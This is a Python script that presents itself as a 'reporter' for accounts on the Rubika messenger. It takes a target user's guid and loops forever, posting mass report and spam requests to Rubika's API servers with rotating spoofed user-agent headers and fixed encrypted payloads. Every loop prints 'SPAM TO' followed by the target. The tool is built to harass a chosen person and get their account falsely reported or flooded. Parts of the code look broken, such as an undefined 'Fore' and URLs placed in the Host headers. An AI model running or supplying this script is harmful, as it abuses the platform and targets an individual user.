#!/usr/bin/python
# reporter whith guid whith 13 api for account rubika / powerful

#payload
import requests
import time,os,sys
import datetime
#----------

#------------- the colors ----------
green = "\033[32m"
red = "\033[31m"
blue = "\033[36m"
pink = "\033[35m"
yellow = "\033[93m"
darkblue = "\033[34m"
white = "\033[00m"
mark = '\x1b[38;5;4m' #blue
mark1 = '\x1b[48;5;15m' # white for back ground start
mark2 = '\x1b[0m' #end
#-----------------------------------------
timer = (datetime.datetime.today())
time.sleep(1)
os.system("clear")
banner = (f"""{yellow}
[{timer}]
{darkblue}


[the powerful on the report account]
{blue}
_________________
[REPORTER RUBIKA]
[METHOD ACCOUNT ]
_________________
{pink}
\n\n[{pink}enter {red}[guid] {pink}target for report{green} [type] {white} ⟩⟩ {darkblue}""")
for bnr in banner:
        sys.stdout.write(bnr)
        sys.stdout.flush()
        time.sleep(0.01)
        
md = input()
print("\n\n")
time.sleep(2)
input(F'{yellow}enter your for attack to account')
print('\n'*40)
time.sleep(1)
print(F"{mark1}_________________________\n{mark2}")
# ----- rubika api for algorithm report send to server; ---------

#--------
#-----------

# api 1

header1 = {"Host":"https://messengerg2c12.iranlms.ir/","Content-Type":"application/json","Accept":"application/json, text/plain, */*","content-length":"3037","content-type":"application/json","origin":"https://web.rubika.ir/","UserAgent":"Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36"}




data = {"data_enc":"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"}

guid = 'u0D8qFG024f5a12b295655debbe18ca3'


report1 = {"api_version":"5","method":"account","data":{"guid":f"{md}","send_type":f"{data}"}}

json = {"api_version":"5","method":"account","data_enc":"lrvEQUf6bSW1pOKSdixz5ygPgI5ZH+SLzSMrAlW73YDZovH9YeQDnv95gPZdIc1yz+6hKx56d64cKxUa3MG/vcCIBQTxiq2q3KKlUB7ku3/DO2rQAYCSFGCTfnUgeJesKGkqQ5k8gseHtGjL6oFzoiUxYBl6VC4ztJnQTfjmDY41KajqYHEysRueikewRHxVf2WB0yzs6PVw7p/lsr2bg3VU3PBbWnTcYdgaxd3SL/U=","data":{"guid":f"{md}","send_type":f"{data}"}}


#-----
		
		

report = "M3gt6HHdtuTe/aYlHX1cuzXkbIMoypfrH26t6/bDOdlfK14mWntjb6FJCQI/qxBwwlgCv/tzwZVJLmjN0BGlOlXpLDKf9EOVvIOwD+6XC0+C4DQIgdJVpFR/OqpBeAMigpCAKajdFYu9B2ofxcz2DnZEx5OOphfJStePkcYf6fuE1ravEnFDlmCeSmtHzVEZPjYy9+Q197fFW368cWcZHPiPL1UvApUPAia7AQ4ltjNOuYslC06mnuxwnEs+nGWxJou2oSIIguVeAHpuJnL42VU278N+6mS6YhI6W/Y83eo1qxngKtlKsIywZ/MLxapgmCBNq228er255B683+Au38owmMGA/krIeSti9DGs+Ds3N220vQFnBChcIjSajKumWLXWAlz7FggYlQUXRO1gIrqH900aYuhLymoq+Aq80mqec0OAY1BKhw0SJUSK3IkTIW1mskLRazVoMSronxuOZjiEHYxAGK/B0uy/Gg4IuYkK6vKBHjTdhd8vgC/h2B4atzH9v8JQylzUOWjjxe2CjxHTmIpQYjoZ7610SDoqr6eSEUsMM/qIoUqgEQmVCQoK+mOSahMWY5WcZxT1MU4h+1OhoKVnwIjS8gLdBX4vvmhF/FPjOUquDpg8oDRWmmZPqhkNv2ES/i9bEZ6XeAMbdlMSfm1Xddjxc1/RS4o5SIU"
#
# api 2
headers8 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 2

headers7 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_1_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Edg/89.0.774.68","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 4

headers6 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 5

headers5 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 6

headers4 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 7

headers3 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (X11; Linux i686; rv:88.0) Gecko/20100101 Firefox/88.0","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 8


headers2 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}


# api 9


headers1 = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) Version/7.0 Mobile/11D167 Safari/9537.53","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 10

headers = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 11

header = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 12

head = {"Host": "https://messenger817.iranlms.ir/","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; FIG-LA1 Build/HUAWEIFIG-LA1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/79.0.3945.116 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/","accept-encoding": "gzip, deflate, br","accept-language": "fa-IR,fa;q\u003d0.9,en-GB;q\u003d0.8,en;q\u003d0.7,en-US;q\u003d0.6"}

# api 13

filter = {"Host": "https://messenger817.iranlms.ir/GetFile.ashx","content-length": "96","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.111 Mobile Safari/537.36","content-type": "text/plain","origin": "https://web.rubika.ir","sec-fetch-site": "cross-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://web.rubika.ir/"}


reporter = {"api_version":"5","method":"account","data":{"guid":f"{md}","send_type":f"{report}"}}
 


json = {"api_version":"5","guid":f"{md}","method":"report","data":f"{report}"}

#------------------
# ----- attack ----- ;
while True:
    timer = (datetime.datetime.today())
    try:
        requests.post("https://messenger817.iranlms.ir/GetFile.ashx",headers=filter,json=json)
        time.sleep(2)
        print(F"{blue}\n[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
        time.sleep(2)
        print(F"{red}\n[NOT] SPAM")
    try:
         requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=header)
         time.sleep(1)
         print(F'{blue}\n[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n')
         time.sleep(2)
    except:
     	time.sleep(1)
     	print(F'{red}[NOT] SPAM')
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=head)
     	time.sleep(1)
     	print(F"\n{blue}[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
     	
    except:
         time.sleep(1)
         print(F'{red}\n[NOT] SPAM')
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers)
     	time.sleep(1)
     	print(F"{blue}\n[SEND]{darkblue} SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F'{red}[NOT] SPAM')
#---
#----
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers1)
     	time.sleep(1)
     	print(F"{blue}\n[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F'{red}[NOT] SPAM')
     	
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers2)
     	time.sleep(1)
     	print(F"\n{blue}[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F'\n{red}[NOT] SPAM')
     	     	
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers3)
     	time.sleep(1)
     	print(F"\n{blue}[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F'{red}\n[NOT] SPAM')
#----
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers4)
     	time.sleep(1)
     	print(F"\n{blue}[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F'\n{red}[NOT] SPAM')
     	
#--
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers5)
     	time.sleep(1)
     	print(F"{blue}\n[SEND]{darkblue} SPAM TO: {yellow}{md} |{pink} {timer}\n")
    except:
     	time.sleep(1)
     	print(f'\n{red}[NOT] SPAM')
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers6)
     	time.sleep(1)
     	print(F"{blue}\n[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F'{red}\n[NOT] SPAM')
#---
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers7)
     	time.sleep(1)
     	print(F"\n{blue}[SEND] {darkblue}SPAM TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(f'{red}\n[NOT] SPAM')
#---
#---
    try:
     	requests.post("https://messenger817.iranlms.ir/",json=reporter,headers=headers8)
     	time.sleep(1)
     	print(F"\n{blue}[SEND] {darkblue}SPAM TO: {yellow}{md} |{pink} {timer}\n")
    except:
     	time.sleep(1)
     	print(f'{red}\n[NOT] SPAM')
     	
     	
    try:
    	requests.post("https://messengerg2c12.iranlms.ir/",json=json,headers=headers,data=data)
    	time.sleep(1)
    	print(F"{blue}\n[SEND] SPAM {darkblue}[#] TO: {yellow}{md} | {pink}{timer}\n")
    except:
    	time.sleep(1)
    	print(Fore.RED+"\n[NO] SPAM\n")
    try:
    	requests.post("https://messengerg2c12.iranlms.ir/",json=report1,headers=header1,data=data)
    	time.sleep(1)
    	print(F"{blue}\n[SEND] SPAM {darkblue}[#] TO: {yellow}{md} | {pink}{timer}\n")
    except:
     	time.sleep(1)
     	print(F"{red}\n[NO] SPAM")
     	
# the end